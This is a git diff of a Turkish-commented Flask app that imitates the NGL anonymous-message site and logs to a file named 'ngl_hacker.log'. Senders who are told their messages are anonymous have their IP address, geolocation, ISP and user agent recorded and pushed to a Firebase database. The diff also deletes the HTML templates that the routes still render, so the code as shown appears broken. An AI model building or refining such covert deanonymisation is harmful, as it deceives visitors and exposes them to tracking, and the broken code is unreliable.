@@ -4,190 +4,14 @@ import requests
 import os
 from datetime import datetime
 
-# Firebase Admin SDK import'ları
+# Firebase import'ları
 import firebase_admin
 from firebase_admin import credentials, db
 import json
 
-# HTML string'lerini EN ÜSTE koy (önce tanımlansın, route'lar kullanabilsin)
-HOME_HTML = """
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NGL - Anonim Mesaj</title>
-    <style>
-        body {
-            background: linear-gradient(135deg, #000000, #1a0033);
-            color: white;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 20px;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        h1 {
-            font-size: 4rem;
-            font-weight: 800;
-            margin-bottom: 20px;
-            background: linear-gradient(90deg, #ff00cc, #3333ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        input[type="text"] {
-            width: 80%;
-            max-width: 400px;
-            padding: 15px;
-            font-size: 1.2rem;
-            border: none;
-            border-radius: 50px;
-            background: rgba(255,255,255,0.1);
-            color: white;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        input[type="text"]::placeholder { color: rgba(255,255,255,0.6); }
-        button {
-            padding: 16px 50px;
-            background: linear-gradient(90deg, #ff00cc, #3333ff);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 1.3rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover { transform: scale(1.05); }
-        .info {
-            margin-top: 30px;
-            font-size: 0.9rem;
-            opacity: 0.7;
-            color: #ccc;
-        }
-    </style>
-</head>
-<body>
-    <h1>NGL Anonim</h1>
-    <p>Kullanıcı adını gir (isteğe bağlı)</p>
-    <form method="GET" action="/">
-        <input type="text" name="username" placeholder="Kullanıcı adı gir (örn: muhammedemin)" autocomplete="off">
-        <button type="submit">Devam Et</button>
-    </form>
-    <div class="info">Boş bırakırsan rastgele bir isim kullanılır</div>
-</body>
-</html>
-"""
-
-NGL_HTML = """
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NGL</title>
-    <style>
-        body {
-            background: linear-gradient(135deg, #000000, #1a0033);
-            color: white;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 20px;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        h1 {
-            font-size: 4rem;
-            font-weight: 800;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, #ff00cc, #3333ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        p { font-size: 1.3rem; opacity: 0.8; margin-bottom: 40px; }
-        textarea {
-            width: 80%;
-            max-width: 500px;
-            height: 120px;
-            background: rgba(255,255,255,0.1);
-            border: none;
-            border-radius: 16px;
-            padding: 20px;
-            color: white;
-            font-size: 1.2rem;
-            resize: none;
-            outline: none;
-            backdrop-filter: blur(10px);
-        }
-        textarea::placeholder { color: rgba(255,255,255,0.6); }
-        button {
-            margin-top: 30px;
-            padding: 16px 40px;
-            background: linear-gradient(90deg, #ff00cc, #3333ff);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 1.3rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover { transform: scale(1.05); }
-        .success {
-            font-size: 2rem;
-            margin-top: 50px;
-            animation: fadeIn 1s;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-    </style>
-</head>
-<body>
-    {% if success %}
-        <div class="success">✅ Mesajın gönderildi!</div>
-        <p>gizlilik esastır.</p>
-    {% else %}
-        <h1>@{{ username }}</h1>
-        <p>Anonim mesaj gönder</p>
-        <form method="POST">
-            <textarea name="message" placeholder="Buraya yaz..." required></textarea><br>
-            <button type="submit">Gönder</button>
-        </form>
-    {% endif %}
-</body>
-</html>
-"""
-
-# Firebase başlatma (HTML'lerden sonra)
-if not firebase_admin._apps:
-    try:
-        cred_dict = json.loads(os.environ["GOOGLE_APPLICATION_CREDENTIALS"])
-        cred = credentials.Certificate(cred_dict)
-
-        firebase_admin.initialize_app(cred, {
-            "databaseURL": "https://itiraf-a5d24-default-rtdb.firebaseio.com"
-        })
-
-        logging.info("Firebase başarıyla başlatıldı")
-    except Exception as e:
-        logging.error(f"Firebase INIT HATASI: {e}", exc_info=True)
-
-    
-
-# Logging ayarları (Firebase'den sonra)
+# Logging'i DEBUG yap (daha fazla detay çıksın)
 logging.basicConfig(
-    level=logging.INFO,
+    level=logging.DEBUG,
     format='%(asctime)s | %(levelname)s | %(message)s',
     handlers=[
         logging.FileHandler('ngl_hacker.log', encoding='utf-8'),
@@ -197,6 +21,36 @@ logging.basicConfig(
 
 app = Flask(__name__)
 
+# Firebase başlatma (route'lardan önce)
+firebase_initialized = False
+try:
+    logging.debug("Firebase başlatma denemesi başlıyor...")
+
+    if 'GOOGLE_APPLICATION_CREDENTIALS' not in os.environ:
+        logging.error("GOOGLE_APPLICATION_CREDENTIALS environment variable YOK! Render Environment'a ekle.")
+        raise ValueError("GOOGLE_APPLICATION_CREDENTIALS variable eksik!")
+
+    logging.debug("Environment variable bulundu, uzunluk: %d karakter", len(os.environ['GOOGLE_APPLICATION_CREDENTIALS']))
+
+    cred_dict = json.loads(os.environ['GOOGLE_APPLICATION_CREDENTIALS'])
+    logging.debug("JSON parse başarılı, type: %s", type(cred_dict))
+
+    cred = credentials.Certificate.from_service_account_info(cred_dict)
+    logging.debug("Credential oluşturuldu")
+
+    firebase_admin.initialize_app(cred, {
+        'databaseURL': 'https://itiraf-a5d24-default-rtdb.firebaseio.com/'
+    })
+    firebase_initialized = True
+    logging.info("Firebase BAŞARIYLA başlatıldı (Environment Variable'dan)")
+except json.JSONDecodeError as je:
+    logging.error(f"JSON parse hatası: {str(je)} - Variable içeriğini kontrol et! (ekstra boşluk veya karakter olabilir)")
+except ValueError as ve:
+    logging.error(f"ValueError: {str(ve)} - Variable adı veya içerik yanlış olabilir")
+except Exception as e:
+    logging.error(f"Firebase başlatma HATASI: {str(e)}", exc_info=True)
+
+# Route'lar
 @app.route('/', methods=['GET', 'POST'])
 def home():
     username = request.args.get('username', '').strip()
@@ -241,22 +95,24 @@ def ngl_page(username):
             logging.info(log_entry)
             print(f"[YENİ MESAJ] {log_entry}")
 
-            try:
-                message_data = {
-                    "username": username,
-                    "message": msg,
-                    "ip": client_ip,
-                    "location": location,
-                    "isp": isp,
-                    "user_agent": user_agent[:150],
-                    "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
-                }
-               if firebase_admin._apps:
-    ref = db.reference("/messages")
-    ref.push(message_data)
-else:
-    logging.error("Firebase init edilmediği için mesaj kaydedilmedi")
-
+            if firebase_initialized:
+                try:
+                    message_data = {
+                        "username": username,
+                        "message": msg,
+                        "ip": client_ip,
+                        "location": location,
+                        "isp": isp,
+                        "user_agent": user_agent[:150],
+                        "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
+                    }
+                    ref = db.reference('/messages')
+                    ref.push(message_data)
+                    logging.info("[FIREBASE] Mesaj başarıyla kaydedildi")
+                except Exception as e:
+                    logging.error(f"[FIREBASE PUSH HATASI] {str(e)}")
+            else:
+                logging.warning("Firebase başlatılmadığı için push yapılmadı!")
 
         return render_template_string(NGL_HTML, username=username, success=True)
 
